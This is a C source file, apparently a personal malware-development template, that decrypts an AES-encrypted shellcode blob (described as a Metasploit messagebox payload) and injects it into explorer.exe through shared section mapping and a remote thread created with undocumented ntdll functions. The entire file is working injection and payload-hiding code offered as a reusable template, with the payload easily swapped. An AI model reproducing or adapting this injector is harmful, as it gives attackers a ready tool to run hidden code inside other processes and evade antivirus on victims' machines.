/*

 Benjamin Moss Custom code template
 Service binary - payload encryption with AES
 
 Author: Benjamin Moss Kipsoi 
 Email: mossbenjamin254@gmail.com

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "user32.lib")
#include <psapi.h>

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

// 64-bit shellcode to display messagebox, generated using Metasploit on Kali Linux
unsigned char shellcodePayload[] = { 0x84, 0x72, 0x6, 0x98, 0x79, 0x9b, 0xb3, 0xca, 0x45, 0x44, 0xd5, 0x4a, 0x27, 0x79, 0x90, 0x31, 0x2b, 0xd, 0xe8, 0xab, 0xd3, 0x2c, 0xa8, 0x50, 0xbb, 0xeb, 0x5d, 0x3f, 0xcb, 0xef, 0x28, 0xa5, 0x49, 0x49, 0xad, 0x23, 0xff, 0xa1, 0xe, 0x19, 0xa8, 0x22, 0xac, 0xf3, 0x93, 0xe3, 0xed, 0xd9, 0x10, 0x41, 0xb4, 0x5c, 0x6c, 0xe0, 0x3f, 0x34, 0xb3, 0x2b, 0xdb, 0xbf, 0x75, 0xf, 0xfd, 0xd, 0xfb, 0x4, 0x68, 0x7e, 0xe6, 0xe7, 0x34, 0x78, 0x55, 0xa1, 0x6a, 0xf4, 0xcb, 0x14, 0x97, 0x50, 0x1a, 0x41, 0x82, 0x39, 0x11, 0x53, 0x65, 0x4b, 0x6c, 0x28, 0x1a, 0xd4, 0xa8, 0xd2, 0x2, 0x60, 0xad, 0xa7, 0xdf, 0xae, 0x96, 0x75, 0xb6, 0x44, 0x21, 0xf0, 0xf9, 0xcd, 0xb0, 0x97, 0x53, 0xc0, 0x4f, 0x8a, 0x3a, 0xcc, 0x44, 0x7a, 0xde, 0x7e, 0xeb, 0x60, 0x23, 0xb0, 0xed, 0xb4, 0x14, 0xc2, 0x2e, 0xbb, 0xa5, 0x99, 0xa9, 0xfb, 0x74, 0xb7, 0x13, 0x4, 0xf4, 0xab, 0x6f, 0xd2, 0x2f, 0x73, 0x9e, 0x42, 0x99, 0xc4, 0x76, 0xab, 0xd0, 0x39, 0x47, 0xc, 0x69, 0xf4, 0x2d, 0x4a, 0x13, 0xcf, 0x44, 0x55, 0x6d, 0xd4, 0xe0, 0x64, 0x9, 0xbf, 0x27, 0x5, 0x81, 0x7f, 0x80, 0xad, 0xc1, 0xa, 0x72, 0x69, 0xb3, 0x83, 0xf5, 0x4, 0x98, 0xf5, 0xc2, 0xaa, 0x25, 0xed, 0xfe, 0x27, 0xe4, 0xcf, 0x33, 0x7d, 0x2, 0x16, 0xee, 0x9, 0xd5, 0xc0, 0xd2, 0x2b, 0x87, 0xbf, 0xd, 0x0, 0xfa, 0x13, 0x44, 0x85, 0x85, 0x89, 0x2b, 0x9d, 0x7d, 0xcf, 0xea, 0x56, 0x20, 0x92, 0xe0, 0x9f, 0x93, 0x73, 0xe5, 0x92, 0x82, 0xde, 0x34, 0xe7, 0x7e, 0xe4, 0xb1, 0x66, 0xb, 0xec, 0x50, 0xc2, 0x72, 0xfd, 0x4f, 0xb0, 0xf4, 0x86, 0x38, 0x93, 0x44, 0xd6, 0xf7, 0xc, 0x8a, 0x50, 0xce, 0x4e, 0xa, 0x1a, 0xf2, 0x13, 0x49, 0xc6, 0x6, 0xa, 0xc9, 0x1c, 0xab, 0xb3, 0x30, 0x10, 0xb0, 0x38, 0x30, 0x42, 0x7c, 0x28, 0x7c, 0x3f, 0xaf, 0x90, 0xeb, 0xa2, 0x51, 0x3f, 0xdb, 0xb1, 0x13, 0x6a, 0x65, 0xef };

unsigned int lengthOfShellcodePayload = sizeof(shellcodePayload);

unsigned char encryption_key[] = { 0xf3, 0xf, 0xf8, 0x34, 0x3d, 0x6, 0x9, 0x39, 0x3, 0xff, 0x62, 0x11, 0xf5, 0xfd, 0xb8, 0xe6 };


typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; 
	PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;


typedef NTSTATUS (NTAPI * NtCreateSection_Ptr)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 


typedef NTSTATUS (NTAPI * NtMapViewOfSection_Ptr)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);


typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	
	
typedef FARPROC (WINAPI * RtlCreateUserThread_Ptr)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);
	
int SearchForProcess(const char *processName) {

        HANDLE hSnapshotOfProcesses;
        PROCESSENTRY32 processStruct;
        int pid = 0;
                
        hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
                
        processStruct.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
                CloseHandle(hSnapshotOfProcesses);
                return 0;
        }
                
        while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
                if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
                        pid = processStruct.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hSnapshotOfProcesses);
                
        return pid;
}

// map section views injection
int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	// create memory section in local process
	NtCreateSection_Ptr pNtCreateSection = (NtCreateSection_Ptr) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
	if (pNtCreateSection == NULL)
		return -2;
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create local section view
	NtMapViewOfSection_Ptr pNtMapViewOfSection = (NtMapViewOfSection_Ptr) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return -2;
	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// (Optional) Decrypt payload - if your payload is encrypted	
	AESDecrypt((char *) shellcodePayload, lengthOfShellcodePayload, encryption_key, sizeof(encryption_key));

	// copy the payload into the section
	memcpy(pLocalView, payload, payload_len);
	
	// create remote view (in target process)
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	//printf("Addresses: payload = %p ; RemoteView = %p ; LocalView = %p\n", payload, pRemoteView, pLocalView);
	//printf("Press Enter to Continue\n");
	//getchar();

	// execute the payload
	RtlCreateUserThread_Ptr pRtlCreateUserThread = (RtlCreateUserThread_Ptr) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}





int main(void) {
    
	int pid = 0;
    HANDLE hProcess = NULL;

	pid = SearchForProcess("explorer.exe");

	if (pid) {
		//printf("explorer.exe PID = %d\n", pid);

		// try to open target process
		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProcess != NULL) {
			InjectVIEW(hProcess, shellcodePayload, lengthOfShellcodePayload);
			CloseHandle(hProcess);
		}
	}
	return 0;
}

